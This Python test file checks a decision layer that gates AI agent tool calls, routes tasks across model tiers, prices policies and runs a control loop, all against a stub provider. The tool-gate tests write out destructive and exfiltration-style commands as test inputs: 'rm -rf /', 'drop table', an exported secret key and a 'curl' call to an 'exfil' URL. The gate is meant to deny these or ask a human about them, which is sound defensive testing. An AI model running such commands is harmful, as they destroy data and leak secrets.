#!/usr/bin/env python3
"""Behavioural smoke tests for the decision layer. No API key, no network.

Everything runs against a stub provider, which is the point: the whole gate,
route, cascade and control-loop decision surface is testable without spending a
cent or depending on a vendor being up.

    python skills/jev-engineering/eval/test_smoke.py          # from the project root
    python test_smoke.py                                     # from this directory

Exits non-zero on the first failure and prints what was expected.
"""

from __future__ import annotations

import os
import sys
import warnings
from pathlib import Path

ASSETS = Path(__file__).resolve().parents[1] / "assets"
sys.path.insert(0, str(ASSETS))

from jev import (  # noqa: E402
    Choice,
    ControlLoop,
    Model,
    Noul,
    QuestionSpecError,
    Registry,
    RiskLimits,
    Round,
    Score,
    TierProfile,
    ToolGate,
    compare_policies,
    debiased_pairwise,
    decide,
    ensemble,
    expected_task_cost,
    gate,
    normalise_call,
    register_provider,
    router_breakeven_accuracy,
    route_task,
    run_plan,
    speculative,
    two_stage_choice,
    worth_switching,
)
from jev.bulk import label_rows, split_tail, summarise  # noqa: E402
from jev.routing import PolicyStop  # noqa: E402

PASS, FAIL = [], []


def check(name: str, got, want) -> None:
    if got == want:
        PASS.append(name)
    else:
        FAIL.append(f"{name}: got {got!r}, want {want!r}")


def check_true(name: str, cond, detail: str = "") -> None:
    if cond:
        PASS.append(name)
    else:
        FAIL.append(f"{name}: false{(' -- ' + detail) if detail else ''}")


# ---- the stub backend -------------------------------------------------------

SCRIPT: dict = {}


@register_provider("stub")
def _stub(state, questions, model, timeout):
    answers = {}
    for qid, question in questions.items():
        wire = question.to_wire()
        if wire["type"] == "choice":
            keys = list(wire["criteria"])
            pick, conf = SCRIPT.get(qid, (keys[0], 0.95))
            if pick not in keys:
                pick = keys[0]
            rest = (1 - conf) / max(1, len(keys) - 1)
            answers[qid] = {"type": "choice", "choice": pick, "confidence": conf,
                            "probabilities": {k: (conf if k == pick else rest) for k in keys}}
        elif wire["type"] == "score":
            n = len(wire["criteria"])
            level = SCRIPT.get(qid, n - 1)
            answers[qid] = {"type": "score", "score": float(level), "confidence": 0.9,
                            "probabilities": {str(i): (0.9 if i == level else 0.1 / (n - 1))
                                              for i in range(n)}}
        else:
            answers[qid] = {"type": "noul", "noul": float(SCRIPT.get(qid, 0.9))}
    return {"model": "stub-1", "answers": answers, "usage": {"input_tokens": 400, "output_tokens": 8}}


os.environ["JEV_PROVIDER"] = "stub"
warnings.simplefilter("ignore")


# ---- primitives and validation ---------------------------------------------

def test_primitives() -> None:
    SCRIPT.clear()
    SCRIPT.update({"risk": ("read_only", 0.93)})
    r = decide({"cmd": "ls"}, {
        "risk": Choice(instructions="What happens if this runs?",
                       criteria={"read_only": "Only reads", "destructive": "Deletes", "other": "None fits"}),
        "rel": Score(instructions="How relevant is this to the goal?",
                     criteria=["Unrelated", "Background", "Directly needed"]),
        "done": Noul(instructions="Every deliverable named in the goal now exists."),
    })
    check("choice answer", r.answers["risk"].choice, "read_only")
    check("choice confidence", round(r.answers["risk"].confidence, 2), 0.93)
    check("score answer", r.answers["rel"].score, 2.0)
    check("noul answer", r.answers["done"].noul, 0.9)
    check("noul has no native confidence", r.answers["done"].confidence, None)
    check("derived noul certainty", round(r.answers["done"].certainty, 2), 0.8)
    check_true("cost is computed from usage", r.cost_usd > 0)

    for label, thunk in [
        ("1-option Choice", lambda: Choice(instructions="Pick one option", criteria={"a": "only"})),
        ("numeric Score levels", lambda: Score(instructions="Rate this carefully", criteria=["1", "2"])),
        ("empty instructions", lambda: Noul(instructions="")),
        ("blank criteria text", lambda: Choice(instructions="Pick one option", criteria={"a": "x", "b": ""})),
    ]:
        try:
            thunk()
            FAIL.append(f"validation should reject {label}")
        except (QuestionSpecError, ValueError):
            PASS.append(f"validation rejects {label}")


# ---- the gate ---------------------------------------------------------------

def test_gate() -> None:
    SCRIPT.clear()
    SCRIPT["q"] = ("a", 0.93)
    r = decide({}, {"q": Choice(instructions="Pick an option here",
                                criteria={"a": "first", "b": "second", "other": "none fits"})})
    answer = r.answers["q"]
    check("gate acts when confident", gate(answer, tau_act=0.90).exit.value, "act")
    check("gate escalates in the band", gate(answer, tau_act=0.99, tau_ask=0.5).exit.value, "escalate")
    check("gate abstains below the floor", gate(answer, tau_act=0.99, tau_ask=0.95).exit.value, "abstain")
    check("policy beats confidence", gate(answer, tau_act=0.5, policy_flags=[True]).exit.value, "human")

    SCRIPT["q"] = ("other", 0.99)
    r2 = decide({}, {"q": Choice(instructions="Pick an option here",
                                 criteria={"a": "first", "b": "second", "other": "none fits"})})
    check("exit option never auto-approves", gate(r2.answers["q"], tau_act=0.5).exit.value, "human")


# ---- tool gating -----------------------------------------------------------

def test_toolgate() -> None:
    SCRIPT.clear()
    g = ToolGate()

    before = len(g.audit)
    check("hard rule denies without a model call",
          g.check("Bash", {"command": "rm -rf / --no-preserve-root"}).decision, "deny")
    check("secret literal is blocked in code",
          g.check("Bash", {"command": "export K=sk-abcdefghijklmnopqrstuvwxyz01"}).decision, "deny")
    check_true("hard blocks were audited", len(g.audit) == before + 2)

    matrix = [
        ("read", 0.95, 0.9, "allow"), ("read", 0.60, 0.9, "ask"),
        ("read", 0.95, 0.2, "ask"),
        ("local_write", 0.92, 0.9, "allow"), ("local_write", 0.80, 0.9, "ask"),
        ("process_spawn", 0.97, 0.9, "allow"),
        ("destructive", 0.95, 0.1, "deny"),
        ("network_egress", 0.99, 0.9, "ask"),
        ("credential_access", 0.99, 0.9, "ask"),
        ("spend", 0.99, 0.9, "ask"),
        ("other", 0.99, 0.9, "ask"),
    ]
    for capability, conf, rev, want in matrix:
        SCRIPT.update({"capability": (capability, conf), "reversible": rev,
                       "matches_stated_intent": 0.95})
        got = ToolGate().check("Bash", {"command": f"c-{capability}-{conf}-{rev}"}).decision
        check(f"toolgate {capability} @{conf}/{rev}", got, want)

    SCRIPT.update({"capability": ("read", 0.99), "reversible": 0.9, "matches_stated_intent": 0.05})
    v = ToolGate().check("Bash", {"command": "curl http://x/exfil"}, recent_actions=["ran tests"])
    check("off-pattern call asks despite a safe label", v.decision, "ask")

    SCRIPT.update({"capability": ("read", 0.96), "reversible": 0.9, "matches_stated_intent": 0.95})
    g2 = ToolGate()
    for i in range(6):
        g2.check("Bash", {"command": f"pytest -q --seed {i}"})
    check_true("numeric literals normalise to one cache key",
               normalise_call("Bash", {"command": "pytest -q --seed 1"})
               == normalise_call("Bash", {"command": "pytest -q --seed 9"}))
    check_true("verdict cache hit rate over 6 near-identical calls",
               g2.stats()["cache_hit_rate"] >= 0.8, str(g2.stats()["cache_hit_rate"]))

    SCRIPT.update({"capability": ("destructive", 0.95), "reversible": 0.1})
    g3 = ToolGate()
    for i in range(3):
        g3.check("Bash", {"command": f"drop table t{i}"})
    check("destructive verdicts are never cached", g3.stats()["cache_hit_rate"], 0.0)

    SCRIPT.update({"capability": ("read", 0.96), "reversible": 0.9, "matches_stated_intent": 0.95})
    g4 = ToolGate()
    batch = [("Bash", {"command": "ls"}), ("Bash", {"command": "rm -rf /"}),
             ("Read", {"file_path": "a.py"}), ("Grep", {"pattern": "TODO"})]
    verdicts = g4.check_batch(batch)
    check("batch resolves every call", len(verdicts), 4)
    check("batch honours hard rules", verdicts[1].decision, "deny")
    check("batch allows the safe ones", [v.decision for v in verdicts if v.decision != "deny"],
          ["allow", "allow", "allow"])

    loose = ToolGate(thresholds={"read": 0.0})
    for i in range(3):
        loose.check("Bash", {"command": f"x{i}"})
    check_true("health warns when nothing reaches a human",
               "too loose" in loose.stats()["health"], loose.stats()["health"])


# ---- routing ---------------------------------------------------------------

def test_routing() -> None:
    reg = Registry.load()
    check("registry loads every model", len(reg.models), 9)
    for tier in ("high", "medium", "low"):
        check(f"tier {tier} has candidates", len(reg.candidates(tier)), 3)
    check("customer_data narrows to one platform",
          [m.platform for m in reg.candidates("high", data_class="customer_data")], ["anthropic"])
    check("no platform may see secrets", reg.candidates("high", data_class="secrets"), [])

    try:
        reg.get("claude-sonnet-5.5").callable_id
        FAIL.append("an unset api_id should refuse to be sent")
    except Exception:
        PASS.append("an unset api_id refuses to be sent")
    check("a verified api_id passes through",
          reg.get("claude-haiku-4.5").callable_id, "claude-haiku-4-5-20251001")
    check("cheapest priced candidate wins in a tier", reg.select("high").key, "sol-high")
    check("platform exclusion is honoured",
          reg.select("high", exclude_platforms=["openai"]).key, "claude-opus-5.5")

    base = {"tier": ("medium", 0.95), "reversibility": 0, "data_class": ("internal", 0.97),
            "needs_derivation": 0.05}

    SCRIPT.clear(); SCRIPT.update(base)
    check("route honours a confident tier", route_task("x", registry=reg).tier, "medium")

    SCRIPT.update({"tier": ("low", 0.55)})
    check("uncertainty routes up", route_task("x", registry=reg).tier, "high")

    SCRIPT.update({"tier": ("low", 0.97), "reversibility": 2})
    check("irreversibility escalates", route_task("x", registry=reg).tier, "medium")

    SCRIPT.update({"reversibility": 0})
    check("one retry escalates one tier", route_task("x", registry=reg, prior_attempts=1).tier, "medium")
    check("two retries escalate twice", route_task("x", registry=reg, prior_attempts=2).tier, "high")

    SCRIPT.update({"needs_derivation": 0.9})
    check("a derivation escalates", route_task("x", registry=reg).tier, "medium")

    SCRIPT.update({"needs_derivation": 0.05, "data_class": ("secrets", 0.99)})
    try:
        route_task("rotate this key", registry=reg)
        FAIL.append("secrets should be a policy stop")
    except PolicyStop:
        PASS.append("secrets is a policy stop, not a route")

    SCRIPT.update({"data_class": ("internal", 0.97)})
    check("a pinned tier skips the model", route_task("x", registry=reg, pinned_tier="high").tier, "high")


# ---- switching economics ---------------------------------------------------

def test_switching() -> None:
    def m(name, i, o, tier):
        return Model(key=name, display=name, platform="x", tier=tier,
                     input_usd_per_mtok=i, output_usd_per_mtok=o)

    big, small = m("big", 5.0, 25.0, "high"), m("small", 3.0, 15.0, "medium")
    X, Y, Z = 0.65, 0.12, 0.23

    v = worth_switching(big, small, context_mtok=X, output_mtok=Y, inner_mtok=Z)
    check("stay cost matches 25Y+5Z", round(v.stay_usd, 4), round(25 * Y + 5 * Z, 4))
    check("switch cost matches 3X+20Y+8Z", round(v.switch_usd, 4), round(3 * X + 20 * Y + 8 * Z, 4))
    check("a round trip does not pay at a narrow output gap", v.worth_it, False)
    check("no context size rescues it", v.breakeven_context_mtok, None)

    one_way = worth_switching(big, small, context_mtok=0.25, output_mtok=Y, inner_mtok=Z,
                              return_to_current=False)
    check("a one-way handoff pays on a small context", one_way.worth_it, True)
    check_true("break-even context is reported", one_way.breakeven_context_mtok is not None)

    # The documented inequality: Y*(A_out - B_out - A_in) > B_in*(X + Z)
    for (hi_i, hi_o), (md_i, md_o) in [((5, 25), (3, 15)), ((2, 10), (1, 5)), ((3, 15), (0.8, 4)),
                                       ((10, 50), (3, 15)), ((10, 50), (0.8, 4))]:
        a, b = m("a", hi_i, hi_o, "high"), m("b", md_i, md_o, "medium")
        predicted = Y * (hi_o - md_o - hi_i) > md_i * (X + Z)
        actual = worth_switching(a, b, context_mtok=X, output_mtok=Y, inner_mtok=Z).worth_it
        check(f"switch formula holds for {hi_i}/{hi_o} -> {md_i}/{md_o}", actual, predicted)


# ---- economics -------------------------------------------------------------

def test_economics() -> None:
    def m(name, i, o, tier):
        return Model(key=name, display=name, platform="x", tier=tier,
                     input_usd_per_mtok=i, output_usd_per_mtok=o)

    profiles = {
        "low": TierProfile("low", m("l", 0.8, 4.0, "low"), 0.55),
        "medium": TierProfile("medium", m("md", 3.0, 15.0, "medium"), 0.80),
        "high": TierProfile("high", m("h", 10.0, 50.0, "high"), 0.94),
    }
    mix = {"low": 0.55, "medium": 0.30, "high": 0.15}

    usd, calls, esc, done = expected_task_cost([profiles["low"]])
    check_true("a weak tier leaves tasks unfinished", done < 0.7, f"completion {done:.2f}")
    check_true("retries decay rather than compound", calls < 3.0, f"{calls:.2f} calls")

    rows = compare_policies(profiles, routed_tier_mix=mix, router_accuracy=0.90)
    names = [r.name for r in rows]
    check_true("every policy is priced", len(rows) == 5, str(names))
    check_true("rows are sorted cheapest first",
               all(rows[i].usd_per_completed_task <= rows[i + 1].usd_per_completed_task
                   for i in range(len(rows) - 1)))
    climb = next(r for r in rows if r.name == "escalate from low")
    check_true("climbing from cheap completes nearly everything", climb.completion_rate > 0.99)

    be_high = router_breakeven_accuracy(profiles, routed_tier_mix=mix, beat="always high")
    check("routing beats always-high on this workload", be_high.status, "always")
    be_climb = router_breakeven_accuracy(profiles, routed_tier_mix=mix, beat="escalate from low")
    check_true("the climb policy is a real bar", be_climb.status in ("never", "threshold"),
               be_climb.status)
    check_true("break-even statuses are distinguishable", be_high.status != be_climb.status)

    try:
        router_breakeven_accuracy(profiles, routed_tier_mix=mix, beat="nonsense")
        FAIL.append("an unknown policy name should raise")
    except ValueError:
        PASS.append("an unknown policy name raises with the options listed")


# ---- composite decisions ---------------------------------------------------

def test_compose() -> None:
    SCRIPT.clear()
    plan = [
        Round("triage", {"kind": Choice(
            instructions="What does this issue need from the maintainers?",
            criteria={"bug": "A reproducible defect", "question": "Asks how to use something",
                      "other": "None of the above fits"})}),
        Round("severity",
              questions={"severity": Score(instructions="How severe is this defect?",
                                           criteria=["Cosmetic", "Degrades a feature", "Breaks it"])},
              when=lambda s, a: a["kind"].choice == "bug"),
        Round("faq", questions={"in_docs": Noul(instructions="This is already answered in the docs.")},
              when=lambda s, a: a["kind"].choice == "question"),
    ]
    SCRIPT["kind"] = ("bug", 0.96)
    out = run_plan({"issue": "crash"}, plan)
    check("plan takes the bug branch", out.rounds_run, ["triage", "severity"])
    check("plan skips the other branch", out.rounds_skipped, ["faq"])
    check("plan costs one call per round run", out.calls, 2)

    SCRIPT["kind"] = ("question", 0.96)
    out = run_plan({"issue": "how do I login"}, plan)
    check("plan takes the question branch", out.rounds_run, ["triage", "faq"])

    try:
        run_plan({}, [Round("a", {"x": Noul(instructions="statement one here")}),
                      Round("b", {"x": Noul(instructions="statement two here")})])
        FAIL.append("duplicate question ids across rounds should raise")
    except ValueError:
        PASS.append("duplicate question ids across rounds raise")

    SCRIPT["route"] = ("refund", 0.97)
    branch, answers, _ = speculative(
        {"ticket": "broken"},
        shared={"route": Choice(instructions="How should this be resolved?",
                               criteria={"refund": "Money back", "replace": "Send a new one",
                                         "other": "None fits"})},
        branches={"refund": {"amount_ok": Noul(instructions="The refund amount is within policy.")},
                  "replace": {"in_stock": Noul(instructions="A replacement is in stock.")}},
        select=lambda a: a["route"].choice)
    check("speculation selects the branch", branch, "refund")
    check("speculation returns only that branch's answers", sorted(answers), ["amount_ok", "route"])

    families = {"backend": "Server or database", "frontend": "UI or client state"}
    members = {"backend": {"api": "HTTP handlers", "db": "Schema or queries"},
               "frontend": {"css": "Styling"}}
    SCRIPT.update({"family": ("backend", 0.95), "member": ("db", 0.93)})
    check("funnel resolves family and member",
          two_stage_choice({"issue": "slow query"}, families, members,
                           instructions="Which area does this belong to?")[:2], ("backend", "db"))
    SCRIPT["family"] = ("backend", 0.55)
    check("an uncertain family stops after one call",
          two_stage_choice({"issue": "?"}, families, members,
                           instructions="Which area does this belong to?")[:2], (None, None))

    options = {"yes": "It is acceptable", "no": "It is not acceptable", "other": "Cannot tell"}
    variants = {name: Choice(instructions=text, criteria=options) for name, text in {
        "plain": "Is this response acceptable to ship?",
        "strict": "Would a careful reviewer accept this response as-is?",
        "rubric": "Judge whether this response meets the stated bar.",
    }.items()}
    SCRIPT.update({"plain": ("yes", 0.93), "strict": ("yes", 0.91), "rubric": ("yes", 0.95)})
    check("a unanimous ensemble returns a winner", ensemble({"r": "x"}, variants).winner, "yes")
    SCRIPT.update({"strict": ("no", 0.88)})
    check("a split ensemble withholds a winner", ensemble({"r": "x"}, variants).winner, None)

    try:
        ensemble({}, {"a": Choice(instructions="Judge this thing", criteria={"x": "1", "y": "2"}),
                      "b": Choice(instructions="Judge this thing", criteria={"p": "1", "q": "2"})})
        FAIL.append("mismatched ensemble option keys should raise")
    except ValueError:
        PASS.append("mismatched ensemble option keys raise")

    SCRIPT.update({"forward": ("a", 0.80), "reversed": ("b", 0.75)})
    verdict, q, aligned = debiased_pairwise("Which is better?", "A", "B",
                                            instructions="Judge accuracy, not length.")
    check("position bias is averaged out", verdict, "a")
    check_true("aligned probabilities sum to one", abs(sum(aligned.values()) - 1.0) < 1e-9)


# ---- control loop ----------------------------------------------------------

def test_control() -> None:
    SCRIPT.clear()
    menu = {"go": "Take the next step", "read": "Read the screen"}
    executed: list[str] = []

    SCRIPT.update({"action": ("go", 0.95), "done": 0.0})
    loop = ControlLoop(goal="g", observe=lambda: f"state {len(executed)}",
                       actions=lambda o: dict(menu),
                       execute=lambda a, o: executed.append(a),
                       cache_observations=False, stuck_every=0, tau=0.85)
    loop.run(max_ticks=3, max_seconds=5)
    check("a confident action executes", executed, ["go", "go", "go"])

    SCRIPT.update({"action": ("go", 0.60)})
    held = ControlLoop(goal="g", observe=lambda: "s", actions=lambda o: dict(menu),
                       execute=lambda a, o: executed.append("SHOULD NOT RUN"),
                       cache_observations=False, stuck_every=0, tau=0.85)
    ticks = held.run(max_ticks=2, max_seconds=5)
    check("low confidence takes the null action", [t.action for t in ticks[:2]], ["wait", "wait"])
    check("low confidence executes nothing", "SHOULD NOT RUN" in executed, False)

    SCRIPT.update({"action": ("go", 0.95)})
    cached = ControlLoop(goal="g", observe=lambda: "frozen", actions=lambda o: dict(menu),
                         execute=lambda a, o: None, cache_observations=True, stuck_every=0)
    cached.run(max_ticks=6, max_seconds=5)
    check_true("an unchanged observation is not re-decided",
               cached.stats()["cache_hit_rate"] >= 0.8, str(cached.stats()["cache_hit_rate"]))

    tight = ControlLoop(goal="g", observe=lambda: "s", actions=lambda o: dict(menu),
                        execute=lambda a, o: None, tick_budget_s=1e-6,
                        cache_observations=False, stuck_every=0)
    check("a missed tick budget holds", tight.step(0).held, True)

    SCRIPT.update({"done": 0.97})
    disagree = ControlLoop(goal="g", observe=lambda: "s", actions=lambda o: dict(menu),
                          execute=lambda a, o: None, verify_done=lambda: False,
                          cache_observations=False, stuck_every=0)
    history = disagree.run(max_ticks=2, max_seconds=5)
    check_true("verification outranks the model's own 'done'",
               any("verification disagrees" in t.reason for t in history))

    limits = RiskLimits(max_position=10, max_daily_loss=100, max_trades_per_day=3)
    check("an in-limit order is allowed", limits.blocks(size=5), None)
    limits.record(size=5, client_order_id="o1")
    check_true("the position limit blocks", "position limit" in (limits.blocks(size=8) or ""))
    check_true("a duplicate order id blocks",
               "duplicate" in (limits.blocks(size=1, client_order_id="o1") or ""))
    limits.realised_pnl = -150
    check_true("the daily loss limit blocks", "loss limit" in (limits.blocks(size=1) or ""))
    limits.realised_pnl, limits.trades_today = 0, 3
    check_true("the trade count blocks", "trade count" in (limits.blocks(size=1) or ""))


# ---- bulk ------------------------------------------------------------------

def test_bulk(tmp: Path) -> None:
    SCRIPT.clear()
    rows = [{"id": str(i)} for i in range(10)]
    questions = {"kind": Choice(instructions="What does this row need?",
                               criteria={"a": "first kind", "b": "second kind",
                                         "other": "None of the above fits"})}
    SCRIPT["kind"] = ("a", 0.97)

    checkpoint = tmp / "bulk.jsonl"
    out = label_rows(rows, lambda r: {"id": r["id"]}, questions,
                     key_fn=lambda r: r["id"], checkpoint=str(checkpoint),
                     tau=0.90, rpm=1_000_000)
    check("every row is labelled", len(out), 10)
    confident, tail = split_tail(out)
    check("confident rows are separated", len(confident), 10)

    resumed = label_rows(rows + [{"id": "99"}], lambda r: {"id": r["id"]}, questions,
                         key_fn=lambda r: r["id"], checkpoint=str(checkpoint),
                         tau=0.90, rpm=1_000_000)
    check("resume returns every row", len(resumed), 11)
    check_true("probabilities survive the checkpoint",
               bool(resumed[0].probabilities.get("kind")))

    SCRIPT["kind"] = ("other", 0.99)
    exits = label_rows([{"id": "x"}], lambda r: {"id": r["id"]}, questions,
                       key_fn=lambda r: r["id"], tau=0.50, rpm=1_000_000)
    check("the exit option is never counted as confident", exits[0].confident, False)

    stats = summarise(out, "kind")
    check("summarise counts rows", stats["rows"], 10)
    check_true("summarise prices the run", stats["usd"] > 0)


# ---- runner ----------------------------------------------------------------

def main() -> int:
    import tempfile

    tmp = Path(tempfile.mkdtemp())
    for name, fn in [
        ("primitives", test_primitives), ("gate", test_gate), ("toolgate", test_toolgate),
        ("routing", test_routing), ("switching", test_switching), ("economics", test_economics),
        ("compose", test_compose), ("control", test_control),
    ]:
        try:
            fn()
        except Exception as exc:  # noqa: BLE001
            FAIL.append(f"{name} raised {type(exc).__name__}: {exc}")
    try:
        test_bulk(tmp)
    except Exception as exc:  # noqa: BLE001
        FAIL.append(f"bulk raised {type(exc).__name__}: {exc}")

    print(f"  {len(PASS)} behavioural checks passed")
    if FAIL:
        print(f"  {len(FAIL)} FAILED:")
        for line in FAIL:
            print(f"    - {line}")
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
